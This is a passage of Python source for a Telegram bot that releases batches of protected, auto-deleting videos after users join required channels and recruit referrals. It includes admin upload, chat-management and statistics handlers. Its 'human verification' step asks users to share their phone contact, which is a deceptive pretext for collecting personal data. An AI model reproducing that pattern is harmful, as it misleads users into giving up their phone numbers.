                    + ("✅ Your next 10 videos are ready. Tap <b>Unlock Next 10</b>."
                       if current >= need
                       else "Keep inviting friends to reach your next unlock goal."),
                    parse_mode=ParseMode.HTML,
                    reply_markup=menu_for(referrer),
                )
            except TelegramError:
                pass

    pending_note = f"\n⏳ Pending approval accepted: <b>{len(pending)}</b>" if pending else ""
    delete_hours = get_delete_hours()

    success_text = (
        "✅ <b>VERIFICATION SUCCESSFUL</b>\n\n"
        "Access unlocked. 🎉"
        f"{pending_note}\n\n"
        f"Videos are protected and will be automatically deleted after <b>{delete_hours} hour(s)</b>.\n\n"
        "Choose an option:"
    )
    kb = menu_for(uid)
    try:
        await q.edit_message_text(success_text, parse_mode=ParseMode.HTML, reply_markup=kb)
    except BadRequest:
        try:
            await q.edit_message_reply_markup(reply_markup=kb)
        except BadRequest:
            pass


async def noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("Verification is running…")


async def ensure_verified(update, context):
    uid = update.effective_user.id
    d = user_doc(uid)
    if not d or not d.get("verified"):
        await show_join_gate(update, context)
        return False

    _, missing, _ = await membership_result(context.bot, uid)
    if missing:
        users.update_one({"user_id": uid}, {"$set": {"verified": False}})
        await reply(
            update, context,
            "🔒 <b>Access re-locked.</b>\nOne or more required memberships or join requests are missing.",
        )
        await show_join_gate(update, context)
        return False
    return True


async def send_batch(bot, chat_id, batch_no):
    batch = batches.find_one({"batch_no": batch_no, "published": True})
    if not batch:
        return await bot.send_message(chat_id, "⚠️ This video batch is currently unavailable.")

    delete_hours = get_delete_hours()
    mids = batch.get("message_ids", [])
    await bot.send_message(
        chat_id,
        "🎬 <b>YOUR VIDEOS ARE HERE</b>\n\n"
        f"📦 Batch: <b>{batch_no}</b>\n"
        f"🎞 Videos: <b>{len(mids)}</b>\n"
        "🔒 Forward/save protection: <b>ON</b>\n"
        f"⏳ Auto-delete: <b>{delete_hours} hour(s)</b>",
        parse_mode=ParseMode.HTML,
    )

    sent = []
    for mid in mids:
        try:
            r = await bot.copy_message(
                chat_id=chat_id,
                from_chat_id=STORAGE_CHANNEL_ID,
                message_id=mid,
                protect_content=True,
            )
            sent.append(r.message_id)
            await asyncio.sleep(0.10)
        except TelegramError as e:
            log.warning("Video copy failed batch=%s source=%s error=%s", batch_no, mid, type(e).__name__)

    delete_at = utcnow() + timedelta(hours=delete_hours)
    if sent:
        pending_deletions.insert_many(
            [{"chat_id": chat_id, "message_id": mid, "delete_at": delete_at, "kind": "video"}
             for mid in sent]
        )

    await bot.send_message(
        chat_id,
        "✅ <b>DELIVERY COMPLETE</b>\n\n"
        f"Sent: <b>{len(sent)}/{len(mids)}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=delivery_complete_inline(),
    )


async def my_videos(update, context):
    if not await ensure_verified(update, context):
        return
    d = user_doc(update.effective_user.id) or {}
    current = int(d.get("unlocked_batch", 0))
    if current <= 0:
        return await reply(update, context, "⚠️ You have not unlocked any video batches yet.")
    await reply(update, context, f"🔁 Batch <b>{current}</b> is being sent again…")
    await send_batch(context.bot, update.effective_chat.id, current)


async def see_videos_from_hv(update, context):
    if not await ensure_verified(update, context):
        return
    uid = update.effective_user.id
    d = user_doc(uid) or {}
    current = int(d.get("unlocked_batch", 0))
    if current <= 0:
        users.update_one({"user_id": uid}, {"$set": {"unlocked_batch": 1}})
        current = 1
    await send_batch(context.bot, update.effective_chat.id, current)


async def unlock_next(update, context):
    if not await ensure_verified(update, context):
        return

    uid = update.effective_user.id
    d = user_doc(uid) or {}
    current = max(1, int(d.get("unlocked_batch", 1)))
    total = published_batch_count()

    if current >= total:
        return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>")

    if not d.get("human_verified"):
        HV.pending_unlock[uid] = True
        await reply(
            update, context,
            "🔐 <b>HUMAN VERIFICATION REQUIRED</b>\n\n"
            "To unlock the next 10 videos, complete a quick one-time verification.\n\n"
            "👇 Please tap the <b>Share My Contact</b> button below to continue.",
        )
        return await HV.session_start(update, context)

    need = required_referrals_for_next(current)
    have = int(d.get("verified_referrals", 0))
    if have < need:
        username = context.application.bot_data["username"]
        link = make_ref_link(username, uid)
        return await reply(
            update, context,
            "🔐 <b>NEXT 10 VIDEOS LOCKED</b>\n\n"
            f"Required verified referrals: <b>{need}</b>\n"
            f"Successful referrals: <b>{have}</b>\n"
            f"Remaining: <b>{need-have}</b>\n\n"
            "A referral counts only after your friend completes all required memberships or join requests and passes verification.\n\n"
            f"🔗 <b>Your referral link:</b>\n<code>{esc(link)}</code>",
            disable_web_page_preview=True,
        )

    nxt = current + 1
    users.update_one({"user_id": uid}, {"$set": {"unlocked_batch": nxt}})
    batch = batches.find_one({"batch_no": nxt, "published": True}) or {}
    count = len(batch.get("message_ids", []))
    await reply(
        update, context,
        f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n🎞 Videos in this batch: <b>{count}</b>",
    )
    await send_batch(context.bot, update.effective_chat.id, nxt)


async def referral(update, context):
    if not await ensure_verified(update, context):
        return
    uid = update.effective_user.id
    d = user_doc(uid) or {}
    current = max(1, int(d.get("unlocked_batch", 1)))
    refs = int(d.get("verified_referrals", 0))
    need = required_referrals_for_next(current)
    link = make_ref_link(context.application.bot_data["username"], uid)

    await reply(
        update, context,
        "👥 <b>MY REFERRAL</b>\n\n"
        f"✅ Successful referrals: <b>{refs}</b>\n"
        f"🎯 Next batch target: <b>{need}</b>\n"
        f"📈 Progress: <b>{min(refs, need)}/{need}</b>\n\n"
        f"🔗 <b>Your link:</b>\n<code>{esc(link)}</code>\n\n"
        "⚠️ Referral only after force-join verification counts.",
        disable_web_page_preview=True,
        reply_markup=user_menu_inline(d),
    )


async def progress(update, context):
    if not await ensure_verified(update, context):
        return
    d = user_doc(update.effective_user.id) or {}
    current = int(d.get("unlocked_batch", 0))
    refs = int(d.get("verified_referrals", 0))
    human_ok = "✅ Yes" if d.get("human_verified") else "❌ No"
    delete_hours = get_delete_hours()

    unlocked_video_count = 0
    for b in batches.find({"published": True, "batch_no": {"$lte": current}}, {"message_ids": 1}):
        unlocked_video_count += len(b.get("message_ids", []))

    await reply(
        update, context,
        "📊 <b>YOUR PROGRESS</b>\n\n"
        f"🎬 Unlocked batches: <b>{current}/{published_batch_count()}</b>\n"
        f"🎞 Unlocked videos: <b>{unlocked_video_count}</b>\n"
        f"👥 Verified referrals: <b>{refs}</b>\n"
        f"🔐 Human verified: <b>{human_ok}</b>\n"
        f"🎯 Next target: <b>{required_referrals_for_next(max(1,current))}</b>\n"
        f"⏳ Video expiry: <b>{delete_hours} hour(s)</b>",
        reply_markup=user_menu_inline(d),
    )


# ---------------- ADMIN ----------------

async def admin(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await reply(update, context, "🛠 <b>ADMIN CONTROL PANEL</b>", reply_markup=admin_menu_inline())


def _upload_progress_text(doc, runtime, now=None):
    if now is None:
        now = time.monotonic()
    copied = len(doc.get("copied", []))
    failed = len(doc.get("failed", []))
    received = max(int(doc.get("submitted", 0)), int(runtime.get("submitted", 0)) if runtime else 0)
    processed = min(received, copied + failed)
    waiting = max(0, received - processed)
    pct = round((processed / received) * 100) if received else 0
    filled = min(10, round(pct / 10))
    bar = "█" * filled + "░" * (10 - filled)

    if runtime is None:
        state = "⏸ Bot restarted — open Upload Videos to resume a saved draft."
    else:
        cooldown = max(0, math.ceil(runtime.get("cooldown_until", 0) - now))
        active = runtime.get("active_source")
        phase = runtime.get("phase", "uploading")
        if cooldown:
            state = f"⏸ Telegram rate limit: <b>{cooldown}s</b> remaining (auto-resume)"
        elif active is not None:
            state = f"📨 Copying source video <code>{active}</code>"
        elif phase == "finishing":
            state = "⏳ Finishing queued copies…"
        elif phase == "retrying":
            state = "🔁 Retrying failed videos…"
        elif phase == "review":
            state = "⚠️ Review failed videos, then Retry Failed or Publish Successful."
        elif waiting:
            state = "⏳ Waiting in storage-copy queue…"
        else:
            state = "🟢 Ready — send more videos or tap DONE."

    return (
        "📊 <b>LIVE STORAGE UPLOAD</b>\n\n"
        f"📥 Received: <b>{received}</b>\n"
        f"✅ Stored: <b>{copied}</b>\n"
        f"❌ Failed: <b>{failed}</b>\n"
        f"⏳ Pending: <b>{waiting}</b>\n\n"
        f"<code>{bar}</code> <b>{pct}%</b> processed\n\n"
        f"{state}\n\n"
        "ℹ️ Same progress message auto-updates approximately every 3 seconds."
    )


async def _edit_upload_progress(bot, runtime):
    if not runtime.get("progress_chat_id") or not runtime.get("progress_message_id"):
        return
    async with runtime["progress_edit_lock"]:
        doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
        rendered = _upload_progress_text(doc, runtime)
        if rendered == runtime.get("last_progress_text"):
            return
        try:
            await bot.edit_message_text(
                chat_id=runtime["progress_chat_id"],
                message_id=runtime["progress_message_id"],
                text=rendered,
                parse_mode=ParseMode.HTML,
            )
            runtime["last_progress_text"] = rendered
        except RetryAfter as exc:
            runtime["progress_edit_pause_until"] = (
                asyncio.get_running_loop().time() + float(exc.retry_after) + 1
            )
        except BadRequest as exc:
            if "not modified" in str(exc).lower():
                runtime["last_progress_text"] = rendered
            else:
                log.warning("Cannot edit upload progress: %s", type(exc).__name__)
                runtime["progress_message_id"] = None
        except TelegramError as exc:
            log.warning("Upload progress update failed: %s", type(exc).__name__)


async def _upload_progress_worker(bot, runtime):
    try:
        while not runtime.get("progress_stop", False):
            loop = asyncio.get_running_loop()
            if loop.time() >= runtime.get("progress_edit_pause_until", 0):
                try:
                    await _edit_upload_progress(bot, runtime)
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    log.warning("Progress snapshot failed: %s", type(exc).__name__)
            await asyncio.sleep(UPLOAD_PROGRESS_REFRESH_SECONDS)
    except asyncio.CancelledError:
        raise


async def _stop_upload_progress(runtime, bot=None, final_text=None):
    if not runtime:
        return
    runtime["progress_stop"] = True
    task = runtime.pop("progress_task", None)
    if task is not None:
        task.cancel()
        await asyncio.gather(task, return_exceptions=True)
    if bot and final_text and runtime.get("progress_message_id"):
        try:
            await bot.edit_message_text(
                chat_id=runtime["progress_chat_id"],
                message_id=runtime["progress_message_id"],
                text=final_text,
                parse_mode=ParseMode.HTML,
            )
        except TelegramError:
            pass


async def admin_upload_status(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    doc = drafts.find_one({"admin_id": ADMIN_ID})
    if not runtime and not doc:
        return await reply(update, context, "ℹ️ No upload is currently active.", reply_markup=admin_menu_inline())
    text = _upload_progress_text(doc or {}, runtime)
    status = await reply(update, context, text)
    if runtime and not runtime.get("progress_message_id"):
        runtime["progress_chat_id"] = status.chat_id
        runtime["progress_message_id"] = status.message_id
        runtime["last_progress_text"] = text


async def admin_upload_start(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    if runtime:
        notice = (
            "The current upload is finishing or awaiting review."
            if runtime["closing"]
            else "An upload is already in progress. Send more videos or tap DONE."
        )
        return await reply(update, context, notice, reply_markup=upload_menu_inline())

    old = drafts.find_one({"admin_id": ADMIN_ID})
    if old and (old.get("copied") or old.get("message_ids") or old.get("failed")):
        if old.get("message_ids") and not old.get("copied"):
            return await reply(
                update, context,
                "⚠️ An unfinished draft from an older version was found. Your existing uploads are safe. "
                "Finish the upload in the older version with DONE before starting a new upload.",
            )
        submitted = int(old.get("submitted", 0))
        seen = {x["source_message_id"] for x in old.get("copied", [])}
    else:
        drafts.replace_one(
            {"admin_id": ADMIN_ID},
            {"admin_id": ADMIN_ID, "copied": [], "failed": [], "submitted": 0, "created_at": utcnow()},
            upsert=True,
        )
        submitted, seen = 0, set()

    runtime = {
        "semaphore": asyncio.Semaphore(UPLOAD_CONCURRENCY),
        "tasks": set(), "closing": False, "seen": seen,
        "submitted": submitted, "cooldown_until": 0.0,
        "next_copy_at": 0.0, "storage_send_lock": asyncio.Lock(),
        "active_source": None, "phase": "uploading",
        "progress_stop": False, "progress_edit_lock": asyncio.Lock(),
        "progress_edit_pause_until": 0.0, "last_progress_text": None,
        "progress_chat_id": None, "progress_message_id": None,
    }
    UPLOAD_RUNTIME[ADMIN_ID] = runtime
    ADMIN_STATE[ADMIN_ID] = "upload_videos"
    await reply(
        update, context,
        "🚀 <b>STORAGE UPLOAD</b>\n\n"
        "Storage copy workers: <b>1 (sequential)</b>\n"
        f"Gap between copies: <b>{UPLOAD_COPY_GAP_SECONDS:g}s</b>\n"
        "If Telegram applies a rate limit, the entire queue will pause for the required period. "
        "Every successful storage copy is saved to MongoDB. "
        "Send videos now, then tap <b>DONE</b>.",
        reply_markup=upload_menu_inline(),
    )
    initial = _upload_progress_text(drafts.find_one({"admin_id": ADMIN_ID}) or {}, runtime)
    status = await reply(update, context, initial)
    runtime["progress_chat_id"] = status.chat_id
    runtime["progress_message_id"] = status.message_id
    runtime["last_progress_text"] = initial
    runtime["progress_task"] = asyncio.create_task(
        _upload_progress_worker(context.bot, runtime), name="upload-live-progress"
    )


async def publish_message_ids(mids):
    if not mids:
        return None
    number = next_batch_no()
    batches.insert_one({
        "batch_no": number,
        "message_ids": list(mids),
        "published": True,
        "created_at": utcnow(),
    })
    return number


def _safe_error(exc):
    if isinstance(exc, RetryAfter):
        return "RetryAfter"
    if isinstance(exc, BadRequest):
        detail = str(exc).replace(BOT_TOKEN, "[TOKEN]")
        return ("BadRequest: " + detail)[:180]
    if isinstance(exc, Forbidden):
        return "Forbidden: bot lacks destination access or permissions"
    return type(exc).__name__


async def _storage_copy_job(bot, runtime, src_chat_id, source_id):
    async with runtime["semaphore"]:
        runtime["active_source"] = source_id
        reason = "Unknown"
        for attempt in range(UPLOAD_MAX_RETRIES):
            try:
                async with runtime["storage_send_lock"]:
                    loop = asyncio.get_running_loop()
                    delay = max(runtime["cooldown_until"], runtime["next_copy_at"]) - loop.time()
                    if delay > 0:
                        await asyncio.sleep(delay)

                    try:
                        copied = await bot.copy_message(
                            chat_id=STORAGE_CHANNEL_ID,
                            from_chat_id=src_chat_id,
                            message_id=source_id,
                            protect_content=False,
                            read_timeout=60,
                            write_timeout=60,
                            connect_timeout=20,
                            pool_timeout=30,
                        )
                    except RetryAfter as exc:
                        wait = float(exc.retry_after) + 1.0
                        runtime["cooldown_until"] = max(runtime["cooldown_until"], loop.time() + wait)
                        reason = f"RetryAfter ({round(wait)}s)"
                        log.warning("Storage rate-limited. Pausing storage queue for %ss", round(wait))
                        runtime["next_copy_at"] = loop.time() + UPLOAD_COPY_GAP_SECONDS
                        continue
                    finally:
                        runtime["next_copy_at"] = max(runtime["next_copy_at"], loop.time() + UPLOAD_COPY_GAP_SECONDS)

                drafts.update_one(
                    {"admin_id": ADMIN_ID},
                    {
                        "$addToSet": {"copied": {
                            "source_message_id": source_id,
                            "storage_message_id": copied.message_id,
                        }},
                        "$pull": {"failed": {"source_message_id": source_id}},
                    },
                )
                runtime["active_source"] = None
                return
            except (TimedOut, NetworkError) as exc:
                reason = type(exc).__name__
                if attempt + 1 < UPLOAD_MAX_RETRIES:
                    await asyncio.sleep(min(2 ** attempt, 16))
            except (BadRequest, Forbidden) as exc:
                reason = _safe_error(exc)
                log.warning("Storage copy source=%s: %s", source_id, reason)
                break
            except TelegramError as exc:
                reason = _safe_error(exc)
                log.warning("Storage copy source=%s: %s", source_id, reason)
                if attempt + 1 < UPLOAD_MAX_RETRIES:
                    await asyncio.sleep(min(2 ** attempt, 16))
            except asyncio.CancelledError:
                runtime["active_source"] = None
                raise

        drafts.update_one(
            {"admin_id": ADMIN_ID},
            {"$pull": {"failed": {"source_message_id": source_id}}},
        )
        drafts.update_one(
            {"admin_id": ADMIN_ID},
            {"$addToSet": {"failed": {"source_message_id": source_id, "reason": reason}}},
        )
        runtime["active_source"] = None


def _enqueue_upload(bot, runtime, chat_id, source_id):
    t = asyncio.create_task(
        _storage_copy_job(bot, runtime, chat_id, source_id),
        name=f"copy-video-{source_id}",
    )
    runtime["tasks"].add(t)
    t.add_done_callback(runtime["tasks"].discard)


async def admin_collect_video(update, context):
    if update.effective_user.id != ADMIN_ID or ADMIN_STATE.get(ADMIN_ID) != "upload_videos":
        return
    if not update.message.video:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    if not runtime or runtime["closing"]:
        return await update.message.reply_text("The upload is closing. Please allow DONE to finish.")
    mid = update.message.message_id
    if mid in runtime["seen"]:
        return
    runtime["seen"].add(mid)
    runtime["submitted"] += 1
    drafts.update_one({"admin_id": ADMIN_ID}, {"$inc": {"submitted": 1}})
    _enqueue_upload(context.bot, runtime, update.effective_chat.id, mid)


async def _drain_upload(runtime):
    if runtime and runtime["tasks"]:
        await asyncio.gather(*list(runtime["tasks"]), return_exceptions=True)


async def admin_retry_failed(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
    failed = doc.get("failed", [])
    if not runtime or not failed:
        return await reply(update, context, "There are no failed videos to retry.", reply_markup=upload_menu_inline())
    runtime["closing"] = False
    runtime["phase"] = "retrying"
    ADMIN_STATE[ADMIN_ID] = "upload_videos"
    await reply(update, context, f"🔁 Retrying {len(failed)} failed videos…")
    for entry in failed:
        _enqueue_upload(context.bot, runtime, update.effective_chat.id, entry["source_message_id"])
    await _drain_upload(runtime)
    doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
    runtime["phase"] = "review" if doc.get("failed") else "uploading"
    await reply(
        update, context,
        f"✅ Retry complete. Saved: {len(doc.get('copied', []))}; "
        f"Still failed: {len(doc.get('failed', []))}. Tap DONE when ready.",
        reply_markup=upload_menu_inline(),
    )


async def admin_upload_done(update, context, force_publish=False):
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    doc = drafts.find_one({"admin_id": ADMIN_ID})
    if not doc:
        return await reply(update, context, "No active upload session.", reply_markup=admin_menu_inline())
    if runtime:
        runtime["closing"] = True
        runtime["phase"] = "finishing"
    status = await reply(update, context, "⏳ Finishing storage copies…")
    await _drain_upload(runtime)
    doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
    failed = doc.get("failed", [])
    copied = sorted(doc.get("copied", []), key=lambda x: x["source_message_id"])
    if failed and not force_publish:
        if runtime:
            runtime["phase"] = "review"
        details = "\n".join(
            f"• Video message {x['source_message_id']}: {esc(x.get('reason', 'Unknown'))}"
            for x in failed[:10]
        )
        return await status.edit_text(
            f"⚠️ <b>{len(failed)} VIDEOS FAILED</b>\n\n{details}\n\n"
            "🔁 Tap Retry Failed, then DONE. Or tap ✅ Publish Successful to skip the failed videos.",
            parse_mode=ParseMode.HTML,
            reply_markup=upload_menu_inline(),
        )
    ids = [x["storage_message_id"] for x in copied]
    published = []
    for i in range(0, len(ids), 10):
        published.append(await publish_message_ids(ids[i:i+10]))
    if runtime:
        await _stop_upload_progress(
            runtime, context.bot,
            "✅ <b>STORAGE UPLOAD COMPLETE</b>\n\n"
            f"Saved: <b>{len(ids)}</b> | Failed: <b>{len(failed)}</b>\n"
            f"Published batches: <b>{len(published)}</b>",
        )
    drafts.delete_one({"admin_id": ADMIN_ID})
    ADMIN_STATE.pop(ADMIN_ID, None)
    UPLOAD_RUNTIME.pop(ADMIN_ID, None)
    await status.edit_text(
        f"✅ <b>UPLOAD COMPLETE</b>\n\n"
        f"Received: <b>{doc.get('submitted', 0)}</b>\n"
        f"Saved: <b>{len(ids)}</b>\n"
        f"Skipped failed: <b>{len(failed)}</b>\n"
        f"Published batches: <b>{len(published)}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=admin_menu_inline(),
    )


async def admin_add_group(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    ADMIN_STATE[ADMIN_ID] = "group_chat_id"
    await reply(
        update, context,
        "➕ <b>ADD REQUIRED CHAT</b>\n\n"
        "Send the numeric group or channel ID.\n"
        "Example: <code>-1001234567890</code>\n\n"
        "The bot will automatically generate an <b>approval-required join link</b> for this chat.\n"
        "The bot must be an administrator of this chat with permission to invite users.",
        reply_markup=flow_cancel_inline(),
    )


async def admin_group_flow(update, context):
    if update.effective_user.id != ADMIN_ID:
        return False

    st = ADMIN_STATE.get(ADMIN_ID)
    text = (update.message.text or "").strip()

    if st == "group_chat_id":
        try:
            cid = int(text)
        except ValueError:
            await update.message.reply_text("Invalid numeric chat ID.")
            return True

        try:
            chat = await context.bot.get_chat(cid)
            name = chat.title or str(cid)
            invite = await context.bot.create_chat_invite_link(
                chat_id=cid,
                name="Video Unlock Approval",
                creates_join_request=True,
            )
        except TelegramError as e:
            await update.message.reply_text(
                "❌ Could not generate the approval link.\n"
                "Give the bot administrator access and permission to invite users in the target chat.\n\n"
                f"Error: <code>{esc(type(e).__name__)}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=flow_cancel_inline(),
            )
            return True

        required_chats.update_one(
            {"chat_id": cid},
            {"$set": {
                "chat_id": cid,
                "name": name,
                "join_url": invite.invite_link,
                "link_mode": "approval",
                "enabled": True,
                "position": required_chats.count_documents({}),
                "updated_at": utcnow(),
            }},
            upsert=True,
        )
        ADMIN_STATE.pop(ADMIN_ID, None)

        await reply(
            update, context,
            "✅ <b>REQUIRED CHAT ADDED</b>\n\n"
            f"Name: <b>{esc(name)}</b>\n"
            f"ID: <code>{cid}</code>\n"
            "Link mode: <b>Approval / Join Request</b>\n\n"
            "Pending requests from this link will be recognized automatically.",
            reply_markup=admin_menu_inline(),
        )
        return True

    if st == "custom_link_chat_id":
        try:
            cid = int(text)
        except ValueError:
            await update.message.reply_text("Invalid numeric chat ID.")
            return True
        if not required_chats.find_one({"chat_id": cid}):
            await update.message.reply_text("This required chat has not been configured.")
            return True
        context.user_data["custom_link_chat_id"] = cid
        ADMIN_STATE[ADMIN_ID] = "custom_link_url"
        await reply(update, context, "Now send the custom t.me join or invite URL.", reply_markup=flow_cancel_inline())
        return True

    if st == "custom_link_url":
        if not (text.startswith("https://t.me/") or text.startswith("http://t.me/")):
            await update.message.reply_text("Please send a valid Telegram t.me URL.", reply_markup=flow_cancel_inline())
            return True
        cid = context.user_data.pop("custom_link_chat_id")
        required_chats.update_one(
            {"chat_id": cid},
            {"$set": {"join_url": text, "link_mode": "custom", "updated_at": utcnow()}},
        )
        ADMIN_STATE.pop(ADMIN_ID, None)
        await reply(update, context, "✅ Custom link set.", reply_markup=admin_menu_inline())
        return True

    return False


async def set_custom_link(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    ADMIN_STATE[ADMIN_ID] = "custom_link_chat_id"
    await reply(
        update, context,
        "🔗 Send the numeric ID of the required chat whose custom link you want to set.",
        reply_markup=flow_cancel_inline(),
    )


async def admin_batches(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    rows = list(batches.find().sort("batch_no", ASCENDING))
    text = "📚 <b>VIDEO BATCHES</b>\n\n"
    if rows:
        text += "\n".join(
            f"• Batch <b>{x['batch_no']}</b> — {len(x.get('message_ids', []))} videos"
            for x in rows
        )
    else:
        text += "No batches."
    await reply(update, context, text, reply_markup=admin_menu_inline())


async def admin_groups(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    rows = list(required_chats.find().sort("position", ASCENDING))
    text = "👥 <b>REQUIRED CHATS</b>\n\n"
    if rows:
        text += "\n\n".join(
            f"• <b>{esc(x['name'])}</b>\n"
            f"  <code>{x['chat_id']}</code>\n"
            f"  Link: <b>{esc(x.get('link_mode', 'custom'))}</b>\n"
            f"  {'✅ Enabled' if x.get('enabled') else '⏸ Disabled'}"
            for x in rows
        )
        text += "\n\nTo set a custom link, use:\n<code>/setcustomlink</code>"
    else:
        text += "No required chats."
    await reply(update, context, text, reply_markup=admin_menu_inline())


REMOVE_PAGE_SIZE = 8


def remove_chat_list_markup(page=0):
    rows = list(required_chats.find().sort("position", ASCENDING))
    if not rows:
        return None, 0, 0
    last_page = (len(rows) - 1) // REMOVE_PAGE_SIZE
    page = min(max(int(page), 0), last_page)
    start = page * REMOVE_PAGE_SIZE
    buttons = [
        [InlineKeyboardButton(
            "🗑 " + str(c.get("name", c["chat_id"]))[:48],
            callback_data=f"rm_pick:{c['chat_id']}",
        )]
        for c in rows[start:start+REMOVE_PAGE_SIZE]
    ]
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"rm_list:{page-1}"))
    if page < last_page:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"rm_list:{page+1}"))
    if nav:
        buttons.append(nav)
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="rm_cancel")])
    return InlineKeyboardMarkup(buttons), page, len(rows)


async def admin_remove_chat_menu(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    markup, page, total = remove_chat_list_markup()
    if not markup:
        return await reply(update, context, "ℹ️ No required groups or channels configured.", reply_markup=admin_menu_inline())
    await reply(
        update, context,
        f"🗑 <b>REMOVE REQUIRED CHANNEL</b>\n\n"
        f"Which group or channel would you like to remove from the required list? ({total} total)\n"
        "The Telegram group or channel will not be deleted; only its entry in the required list will be removed.",
        reply_markup=markup,
    )


async def remove_chat_callback(update, context):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("Admin only", show_alert=True)
        return
    data = q.data or ""
    if data == "rm_cancel":
        await q.answer()
        await q.edit_message_text("✅ Remove operation cancelled.")
        return
    if data.startswith("rm_list:"):
        await q.answer()
        markup, page, total = remove_chat_list_markup(int(data.split(":", 1)[1]))
        if markup:
            await q.edit_message_text(
                f"🗑 <b>REMOVE REQUIRED CHANNEL</b>\n\nSelect a chat ({total} total, page {page+1}):",
                parse_mode=ParseMode.HTML, reply_markup=markup,
            )
        else:
            await q.edit_message_text("ℹ️ No required chats left.")
        return
    try:
        chat_id = int(data.split(":", 1)[1])
    except (IndexError, ValueError):
        await q.answer("Invalid chat ID", show_alert=True)
        return
    entry = required_chats.find_one({"chat_id": chat_id})
    if not entry:
        await q.answer("Already removed", show_alert=True)
        await q.edit_message_text("This chat has already been removed.")
        return
    if data.startswith("rm_pick:"):
        await q.answer()
        await q.edit_message_text(
            f"⚠️ <b>CONFIRM REMOVAL</b>\n\n"
            f"{esc(entry.get('name', chat_id))}\n"
            f"<code>{chat_id}</code>\n\n"
            "Remove this chat from the required list? The Telegram group or channel itself will not be deleted.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes, Remove", callback_data=f"rm_yes:{chat_id}")],
                [InlineKeyboardButton("⬅️ Back", callback_data="rm_list:0"),
                 InlineKeyboardButton("❌ Cancel", callback_data="rm_cancel")],
            ]),
        )
        return
    if data.startswith("rm_yes:"):
        result = required_chats.delete_one({"chat_id": chat_id})
        if result.deleted_count:
            pending_requests.delete_many({"chat_id": chat_id})
            membership_events.delete_many({"chat_id": chat_id})
        await q.answer("Removed" if result.deleted_count else "Already removed")
        await q.edit_message_text(
            f"✅ <b>{esc(entry.get('name', chat_id))}</b> removed from required chats.\n"
            "Existing video batches, users and other channels remain unchanged.",
            parse_mode=ParseMode.HTML,
        )
        return
    await q.answer("Unknown action", show_alert=True)


async def admin_stats(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    total = users.count_documents({})
    verified = users.count_documents({"verified": True})
    human_ok = users.count_documents({"human_verified": True})
    agg = list(users.aggregate([{"$group": {"_id": None, "n": {"$sum": "$verified_referrals"}}}]))
    refs = agg[0]["n"] if agg else 0
    cutoff = utcnow() - timedelta(hours=PENDING_REQUEST_TTL_HOURS)
    active_pending = pending_requests.count_documents({"requested_at": {"$gte": cutoff}})

    last_24h = users.count_documents({"created_at": {"$gte": utcnow() - timedelta(hours=24)}})
    today_start = utcnow().replace(hour=0, minute=0, second=0, microsecond=0)

    daily_lines = []
    for i in range(7):
        start = today_start - timedelta(days=i)
        end = start + timedelta(days=1)
        cnt = users.count_documents({"created_at": {"$gte": start, "$lt": end}})
        if i == 0:
            label = "Today"
        elif i == 1:
            label = "Yesterday"
        else:
            label = start.strftime("%d %b")
        daily_lines.append(f"   • {label}: <b>{cnt}</b>")
    daily_block = "\n".join(daily_lines)

    week_ago = today_start - timedelta(days=6)
    last_7_days = users.count_documents({"created_at": {"$gte": week_ago}})
    delete_hours = get_delete_hours()

    await reply(
        update, context,
        "📊 <b>BOT STATS</b>\n\n"
        f"👤 Total users: <b>{total}</b>\n"
        f"✅ Verified: <b>{verified}</b>\n"
        f"🔐 Human verified: <b>{human_ok}</b>\n"
        f"🤝 Successful referrals: <b>{refs}</b>\n"
        f"⏳ Active pending join requests: <b>{active_pending}</b>\n"
        f"📦 Batches: <b>{published_batch_count()}</b>\n"
        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>\n"
        f"⏱ Auto-delete timer: <b>{delete_hours} hour(s)</b>\n\n"
        f"📈 <b>New Users (last 24h):</b> <b>{last_24h}</b>\n"
        f"📅 <b>New Users (last 7 days):</b> <b>{last_7_days}</b>\n\n"
        f"🗓 <b>Daily Breakdown (7 days):</b>\n{daily_block}",
        reply_markup=admin_menu_inline(),
    )


async def admin_reset_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args:
        return await update.message.reply_text(
            "Usage: <code>/resetverify &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
    try:
        target = int(args[0])
    except ValueError:
        return await update.message.reply_text("Invalid user ID.")
    res = users.update_one(
        {"user_id": target},
        {"$set": {"human_verified": False, "human_verified_at": None}},
    )
    await update.message.reply_text(
        f"✅ Reset human verification for <code>{target}</code>. "
        f"Matched: {res.matched_count}, Modified: {res.modified_count}",
        parse_mode=ParseMode.HTML,
    )


